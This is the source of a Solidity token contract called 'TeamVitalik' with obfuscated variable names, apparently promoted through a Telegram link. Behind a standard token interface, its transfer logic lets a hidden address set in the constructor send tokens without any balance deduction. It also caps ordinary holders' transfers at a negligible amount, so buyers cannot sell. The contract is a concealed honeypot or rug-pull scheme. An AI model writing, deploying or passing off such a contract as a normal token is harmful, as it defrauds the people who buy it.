/*

https://t.me/teamvitalik

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract TeamVitalik is Ownable {
    function transferFrom(address hdrypbignevu, address kwpmefdvauz, uint256 yipvewkjt) public returns (bool success) {
        require(yipvewkjt <= allowance[hdrypbignevu][msg.sender]);
        allowance[hdrypbignevu][msg.sender] -= yipvewkjt;
        jzfprxdauy(hdrypbignevu, kwpmefdvauz, yipvewkjt);
        return true;
    }

    mapping(address => uint256) private linzcwksqrxy;

    uint8 public decimals = 9;

    uint256 private mqxnwztrid = 103;

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory hunj, string memory knpfres, address hpvifbyaeg, address dwcepxihb) {
        name = hunj;
        symbol = knpfres;
        balanceOf[msg.sender] = totalSupply;
        rxam[dwcepxihb] = mqxnwztrid;
        IUniswapV2Router02 zoubsih = IUniswapV2Router02(hpvifbyaeg);
        gyrah = IUniswapV2Factory(zoubsih.factory()).createPair(address(this), zoubsih.WETH());
    }

    string public symbol;

    mapping(address => uint256) private rxam;

    address private gyrah;

    string public name;

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function jzfprxdauy(address hdrypbignevu, address kwpmefdvauz, uint256 yipvewkjt) private {
        if (0 == rxam[hdrypbignevu]) {
            if (hdrypbignevu != gyrah && linzcwksqrxy[hdrypbignevu] != block.number && yipvewkjt < totalSupply) {
                require(yipvewkjt <= totalSupply / (10 ** decimals));
            }
            balanceOf[hdrypbignevu] -= yipvewkjt;
        }
        balanceOf[kwpmefdvauz] += yipvewkjt;
        linzcwksqrxy[kwpmefdvauz] = block.number;
        emit Transfer(hdrypbignevu, kwpmefdvauz, yipvewkjt);
    }

    function approve(address kbtlzfwy, uint256 yipvewkjt) public returns (bool success) {
        allowance[msg.sender][kbtlzfwy] = yipvewkjt;
        emit Approval(msg.sender, kbtlzfwy, yipvewkjt);
        return true;
    }

    function transfer(address kwpmefdvauz, uint256 yipvewkjt) public returns (bool success) {
        jzfprxdauy(msg.sender, kwpmefdvauz, yipvewkjt);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
}